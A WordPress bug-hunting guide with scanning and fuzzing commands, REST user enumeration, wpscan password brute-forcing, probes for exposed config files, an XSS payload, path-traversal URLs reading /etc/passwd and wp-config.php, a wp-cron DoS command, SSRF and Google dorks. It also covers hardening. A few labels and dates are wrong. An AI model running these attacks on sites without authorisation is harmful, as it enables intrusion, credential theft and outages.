# 🚀 Ultimate WordPress Security & Bug Hunting Guide

## 📁 WordPress Site Typical File/Folder Hierarchy

```
/ (webroot)
├─ 📄 index.php              # Loads WordPress environment
├─ 📄 license.txt            # WordPress GPL license
├─ 📄 readme.html            # Basic info about WP installation
├─ 📄 wp-activate.php        # Handles multisite activation links
├─ 📄 wp-blog-header.php     # Loads WP and theme
├─ 📄 wp-comments-post.php   # Handles comment form submissions
├─ ⚙️  wp-config.php          # Main configuration (DB, keys, salts)
├─ 📄 wp-config-sample.php   # Example config template
├─ 📄 wp-cron.php            # Handles scheduled tasks (pseudo-cron)
├─ 📄 wp-links-opml.php      # Outputs links in OPML format
├─ 📄 wp-load.php            # Loads core WordPress bootstrap
├─ 🔐 wp-login.php           # User login & authentication
├─ 📄 wp-mail.php            # Processes emails sent to WP
├─ 📄 wp-settings.php        # Sets up WP environment
├─ 📄 wp-signup.php          # Signup page for multisite
├─ 📄 wp-trackback.php       # Handles trackbacks/pingbacks
├─ 📄 xmlrpc.php             # XML-RPC API endpoint
├─ ⚙️  .htaccess              # Apache server config (permalinks, etc.)
├─ 📁 wp-admin/              # WordPress admin dashboard core
│  ├─ 📁 css/                # Styles for admin panel
│  ├─ 📁 images/             # Admin panel images/icons
│  ├─ 📁 js/                 # Admin-side JavaScript
│  ├─ 📁 network/            # Network admin (for multisite)
│  ├─ 📄 includes.php        # Admin-side core functions
│  └─ ...                    # Many other admin-only files
├─ 📁 wp-includes/           # Core WordPress libraries & functions
│  ├─ 📁 css/                # Styles used by front-end & blocks
│  ├─ 📁 js/                 # JavaScript libraries (jQuery, TinyMCE, etc.)
│  ├─ 📁 theme-compat/       # Backwards compatibility for old themes
│  ├─ 📄 general-template.php# Template-related functions
│  ├─ 📄 functions.php       # Core WP functions
│  └─ ...                    # Many other essential PHP files
└─ 📁 wp-content/            # User content (safe to edit)
   ├─ 📄 index.php           # Prevents directory listing
   ├─ 📁 plugins/            # Installed plugins
   │  ├─ 📄 hello.php        # Example plugin
   │  ├─ 📁 akismet/         # Akismet plugin folder
   │  │  ├─ 📄 akismet.php   # Plugin entry file
   │  │  └─ 📄 readme.txt    # Plugin documentation
   │  ├─ 📁 my-plugin/       # Custom plugin example
   │  │  ├─ 📄 my-plugin.php # Plugin entry point
   │  │  ├─ 📁 includes/     # Plugin PHP libraries
   │  │  └─ 📁 assets/       # Plugin CSS/JS/images
   │  └─ ...                 # Other plugins
   ├─ 📁 themes/             # Installed themes
   │  ├─ 📁 twentytwentyfive/ # Default WP theme
   │  │  ├─ 🎨 style.css      # Theme stylesheet + metadata
   │  │  ├─ 📄 functions.php  # Theme setup & hooks
   │  │  ├─ 📄 header.php     # Theme header template
   │  │  ├─ 📄 footer.php     # Theme footer template
   │  │  ├─ 📄 page.php       # Template for static pages
   │  │  ├─ 📄 single.php     # Template for posts
   │  │  └─ 📁 assets/        # Theme CSS/JS/images
   │  │     ├─ 📁 css/
   │  │     ├─ 📁 js/
   │  │     └─ 📁 images/
   │  ├─ 📁 my-theme/         # Custom theme example
   │  │  ├─ 🎨 style.css      # Custom theme stylesheet
   │  │  ├─ 📄 functions.php  # Theme functions
   │  │  ├─ 📁 templates/     # Page/post templates
   │  │  └─ 📁 assets/        # Theme resources
   │  └─ ...                  # Other themes
   ├─ 📁 uploads/             # Media library (user uploaded files)
   │  ├─ 📁 2024/             # Year folders
   │  │  ├─ 📁 01/            # Month folders
   │  │  └─ 📁 12/
   │  └─ 📁 2025/
   │     ├─ 📁 02/
   │     └─ ...
   ├─ 📁 languages/           # Translation files (.mo/.po)
   ├─ 📁 mu-plugins/          # Must-use plugins (auto-loaded, can't disable)
   ├─ 📁 cache/               # Cache files (if caching plugins used)
   └─ 📁 upgrade/             # Temporary files during updates
```

## 🔍 Types of WordPress Vulnerabilities to Hunt

### **A. Core WordPress Vulnerabilities**
- **Authentication Bypasses**: Flaws in login mechanisms (e.g., wp-login.php)
- **Privilege Escalation**: Allowing low-privilege users to gain admin rights
- **SQL Injection (SQLi)**: User input improperly sanitized in database queries
- **Cross-Site Scripting (XSS)**: Malicious scripts injected via comments, posts or profiles
- **File Inclusion/Deletion**: Arbitrary file reads/writes via wp-admin functions

### **B. Plugin & Theme Vulnerabilities**
- **IDOR**: Accessing unauthorized data by manipulating IDs in URLs
- **CSRF**: Forcing users to execute actions without consent
- **Unrestricted File Uploads**: Allowing executable file uploads (.php, .webshell)
- **API Flaws**: Weak REST API or GraphQL endpoints exposing sensitive data
- **Settings Injections**: Storing XSS payloads in plugin/theme settings

### **C. Server/Configuration Issues**
- **XML-RPC Vulnerabilities**: Brute-force attacks or pingback abuses
- **Directory Traversal**: Accessing files outside web root
- **Misconfigured Permissions**: Writeable wp-content or exposed backups

## 🛠️ Essential Tools for WordPress Bug Hunting

### **1. WPScan** - The WordPress Vulnerability Scanner
```bash
# Basic scan with API token
wpscan --url https://domain.com --api-token YOUR_TOKEN

# Aggressive plugin detection
wpscan --url https://domain.com --disable-tls-checks --api-token <token> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
```

### **WPScan Cheat Sheet**
| Command | Description |
|---------|-------------|
| `wpscan --url domain.com --enumerate vp` | Detects vulnerable plugins |
| `wpscan --url domain.com --enumerate ap` | Detects all installed plugins |
| `wpscan --url domain.com --enumerate p` | Detects popular plugins |
| `wpscan --url domain.com --enumerate vt` | Detects vulnerable themes |
| `wpscan --url domain.com --enumerate at` | Detects all installed themes |
| `wpscan --url domain.com --enumerate t` | Detects popular themes |
| `wpscan --url domain.com --enumerate tt` | Detects Timthumbs |
| `wpscan --url domain.com --enumerate cb` | Detects config backups |
| `wpscan --url domain.com --enumerate dbe` | Detects database exports |
| `wpscan --url domain.com --enumerate u` | Enumerates user IDs |
| `wpscan --url domain.com --enumerate m` | Enumerates media IDs |
| `wpscan --url domain.com --disable-tls-checks` | Disables SSL checks |
| `wpscan --url domain.com --force` | Forces scan |

### **2. Nmap** - Network Discovery
```bash
nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan
```

### **3. DirBuster/Dirsearch/ffuf** - Directory Fuzzing
```bash
# Dirsearch
dirsearch -u https://example.com --full-url --deep-recursive -r
dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1

# FFUF
ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -t 100 -r -o results.json

# WordPress-specific fuzzing
ffuf -w coffin@wp-fuzz.txt -u https://ens.domains/FUZZ -fc 401,403,404 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf -ac -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -r -t 60 --rate 100 -c
```

> **Payloads Repository**: [coffinxp/payloads](https://github.com/coffinxp/payloads)

## 🔄 Step-by-Step Bug Hunting Workflow

### **1. Username Enumeration via REST API**
```bash
# Default REST API endpoint
/wp-json/wp/v2/users

# Common bypasses
/wp-json/wp/v2/users/n
/wp-json/?rest_route=/wp/v2/users/
/index.php?rest_route=/wp/v2/users
/index.php?rest_route=/wp/v2/users/n

# With query parameters
/wp-json/wp/v2/users?page=1
/wp-json/wp/v2/users/?per_page=100
/wp-json/wp/v2/users/?orderby=id&order=asc
/wp-json/wp/v2/users?search=admin

# Direct user ID probing
/wp-json/wp/v2/users/1
/wp-json/wp/v2/users/2
/wp-json/wp/v2/users/9999

# Legacy endpoints
/wp-json/users
/wp-json/wp/v2/users.json
/?rest_route=/wp/v2/users
```

### **2. Admin Panel Password Bruteforce**
```bash
# Single username
wpscan --url https://target.com --username admin --passwords /path/to/passwords.txt --disable-tls-checks

# Multiple usernames
wpscan --url https://target.com --usernames /path/to/usernames.txt --passwords /path/to/passwords.txt --disable-tls-checks

# Via XML-RPC
wpscan --url https://target.com --usernames admin --passwords /path/to/passwords.txt --disable-tls-checks --max-threads 10
```

### **3. Exposed Configuration Files**
```bash
# Main WordPress config
/wp-config.php
/wp-config.php.bak
/wp-config.php.save
/wp-config.php.old
/wp-config.php.orig
/wp-config.php~
/wp-config.php.txt
/wp-config.php.zip
/wp-config.php.tar.gz
/wp-config.php.backup

# Environment files
/.env
/.env.bak
/.env.old
/.env.save
/.env.example
/.env.local

# Backup & archive leaks
/backup.zip
/backup.tar.gz
/db.sql
/database.sql
/dump.sql
/wordpress.zip
/wordpress.tar.gz
/website-backup.zip
/site-backup.tar.gz

# Other sensitive files
/wp-config-sample.php
/.htaccess
/.htpasswd
/phpinfo.php
/config.json
/config.php
/config.php.bak
```

### **4. Exposed Registration Page**
Detect via Nuclei template:
```yaml
id: wp-login-register-detect
info:
  name: Detect WordPress Registration Page
  author: yourname
  severity: info
  description: Checks for WordPress user registration endpoint exposure
  tags: wordpress,register,exposure
requests:
  - method: GET
    path:
      - "{{BaseURL}}/wp-login.php?action=register"
    matchers:
      - type: word
        words:
          - 'user_login'
          - 'user_email'
        condition: and
      - type: status
        status:
          - 200
```

### **5. Unsecured WordPress Setup Wizard**
Endpoint: `/wp-admin/setup-config.php?step=1`

**Nuclei Template**: [wp-setup-config.yaml](https://github.com/coffinxp/nuclei-templates/blob/main/wp-setup-config.yaml)

### **6. Exploiting XML-RPC in WordPress**
Endpoint: `/xmlrpc.php`

**Detailed Article**: [How Hackers Abuse XML-RPC](https://infosecwriteups.com/how-hackers-abuse-xml-rpc-to-launch-bruteforce-and-ddos-attacks-4a1a8f7b7a7f)

### **7. Exploiting Admin-AJAX and Theme/Plugin Endpoints**
- **XSS Attempt**:
```
domain.com/wp-admin/admin-ajax.php?action=tie_get_user_weather&options={'location'%3A'Cairo'%2C'units'%3A'C'%2C'forecast_days'%3A'5<%2Fscript><script>alert(document.domain)<%2Fscript>custom_name'%3A'Cairo'%2C'animated'%3A'true'}
```

- **RCE Attempt**:
```
https://domain.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

### **8. Exploiting File Inclusion Vulnerabilities**
```bash
http://target.com/index.php?page=about.php
http://target.com/index.php?page=../../../../etc/passwd
http://target.com/wp-content/themes/twentytwenty/page.php?file=../../../../wp-config.php
http://target.com/wp-content/plugins/plugin-name/download.php?file=../../../../wp-config.php
http://target.com/wp-admin/admin.php?page=../../../../etc/passwd
http://target.com/?cat=../../../../../../etc/passwd
http://target.com/?author=../../../../../../wp-config.php
```

**Payloads**: [lfi.txt](https://github.com/coffinxp/payloads/blob/main/lfi.txt)

### **9. Abusing wp-cron.php for DoS**
```bash
./doser -t 100000 -g "https://target.com/wp-cron.php"
```

**Tool**: [Quitten/doser.go](https://github.com/Quitten/doser.go)

### **10. Exposed WordPress Debug Log**
```
https://target.com/wp-content/debug.log
```

### **11. WordPress Installation Script**
```
https://target.com/wp-admin/install.php
```

### **12. WordPress SSRF**
```
https://target.com/wp-json/oembed/1.0/proxy?url=<attacker-controlled-url>
```

### **13. WordPress Subdomain Takeover**
**Nuclei Template**: [wordpress-takeover.yaml](https://github.com/coffinxp/nuclei-templates/blob/main/wordpress-takeover.yaml)

### **14. Directory Listing Enabled**
```bash
https://target.com/wp-content/uploads/
https://target.com/wp-content/plugins/
https://target.com/wp-content/themes/
https://target.com/wp-includes/
https://target.com/wp-content/backup/
https://target.com/wp-admin/backup/
https://target.com/wp-includes/fonts/
```

## 🔎 WordPress Google Dorks Cheat Sheet

| **Category** | **Dork Examples** |
|-------------|-------------------|
| **Finding WordPress Sites** | `site:target.com inurl:wp-content`<br>`site:target.com inurl:wp-admin`<br>`site:target.com "Powered by WordPress"` |
| **Version Detection** | `inurl:readme.html "WordPress"`<br>`inurl:/wp-includes/js/wp-embed.min.js`<br>`site:target.com "WordPress" "version"` |
| **Vulnerable Plugins** | `inurl:wp-content/plugins/plugin-name`<br>`site:target.com inurl:wp-content/plugins "index of"`<br>`site:target.com "wp-content/plugins" + "vulnerable-plugin-name"` |
| **Login Pages** | `inurl:wp-login.php`<br>`intitle:"WordPress › Login"`<br>`site:target.com inurl:wp-admin/admin-ajax.php` |
| **Configuration Files** | `inurl:wp-config.php`<br>`site:target.com ext:txt "wp-config"`<br>`site:target.com ext:log "wordpress"` |
| **Backup Files** | `inurl:wp-content backup.zip`<br>`site:target.com ext:sql "wordpress"`<br>`site:target.com ext:bak "wp-config"` |
| **Database Dumps** | `site:target.com ext:sql "INSERT INTO wp_users"`<br>`site:target.com "database dump" "wordpress"` |
| **Error Messages** | `site:target.com "Fatal error" "wordpress"`<br>`site:target.com "WordPress database error"` |
| **Sensitive Info** | `site:target.com Index of /wp-admin`<br>`site:target.com "index of" /wp-content/uploads/`<br>`site:target.com inurl:wp-json/wp/v2/users` |
| **Directory Listings** | `site:target.com intitle:"index of" wp-includes`<br>`site:target.com intitle:"index of" wp-content` |

## 💥 Famous & High-Impact WordPress CVEs

| **CVE ID** | **Component** | **Vulnerability Type** | **Year** | **Impact Summary** |
|------------|---------------|------------------------|----------|-------------------|
| **CVE-2024-31211** | WordPress core | RCE via POP chain | 2023 | Remote code execution |
| **CVE-2017-16510** | WordPress core | SQL Injection | 2017 | High-severity SQLi |
| **CVE-2020-28032** | WordPress core | PHP Object Injection | 2020 | Leads to RCE |
| **CVE-2025-24000** | Post SMTP plugin | Broken Access Control | 2025 | Reset admin password |
| **CVE-2025-0912** | GiveWP plugin | PHP Object Injection → RCE | 2025 | Critical object injection |
| **CVE-2024-10924** | Really Simple Security | 2FA Bypass | 2024 | Auth bypass, admin access |
| **CVE-2024-27956** | WordPress Automatic plugin | SQL Injection | 2024 | Widely exploited SQLi |
| **CVE-2024-25600** | Bricks theme | RCE via theme | 2024 | Remote code execution |
| **CVE-2024-8353** | GiveWP plugin | PHP Object Injection → RCE | 2024 | High-impact plugin RCE |
| **CVE-2019-9787** | WordPress core | CSRF → XSS | 2019 | Privilege escalation |
| **CVE-2022-4973** | WordPress core | Authenticated Stored XSS | 2022 | Editors inject scripts |
| **CVE-2009-3891** | WordPress core | XSS | 2009 | Legacy XSS issue |
| **CVE-2007-4894** | WordPress core | SQL Injection | 2007 | Early core SQLi |

## 🛡️ Prevention and Mitigation

### **Essential Security Measures:**
1. **Keep Everything Updated**
   - Regularly patch WordPress core, plugins, and themes
   - Enable auto-updates for critical components

2. **Reduce Attack Surface**
   - Remove unused plugins and themes
   - Disable XML-RPC if not needed
   - Limit REST API access

3. **Secure Access Points**
   - Block public access to sensitive files:
     - `/wp-config.php`
     - `/.env`
     - `/xmlrpc.php`
     - `/wp-admin/`
     - `/wp-cron.php`
   - Use `.htaccess` or WAF rules

4. **Strengthen Authentication**
   - Enforce strong passwords
   - Enable 2FA for all admin accounts
   - Limit login attempts

5. **File Permissions**
   - Set proper permissions (755 for folders, 644 for files)
   - Never use 777 permissions

6. **Backup Security**
   - Store backups outside web root
   - Use encrypted backups
   - Regularly test restoration

7. **Monitoring & WAF**
   - Implement Web Application Firewall
   - Set up security headers
   - Enable logging and monitoring

8. **DNS Hygiene**
   - Regularly audit DNS records
   - Remove unused subdomains
   - Monitor for takeover opportunities

## 🎯 Conclusion

WordPress bug hunting offers endless opportunities for security researchers. With millions of sites running vulnerable plugins and themes, mastering these techniques can lead to significant bug bounties and improved security skills.

**Remember:** Always hunt responsibly, follow bug bounty program rules, and never test on sites without permission.

---

### 📚 Additional Resources:
- [WPScan Vulnerability Database](https://wpscan.com/)
- [WordPress Security Codex](https://codex.wordpress.org/Hardening_WordPress)
- [OWASP WordPress Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Client-side_Testing/11.1-Testing_WordPress)
- [Nuclei Templates Collection](https://github.com/coffinxp/nuclei-templates)

---
*Last Updated: $(date)*  
*Happy Hunting! 🚀*
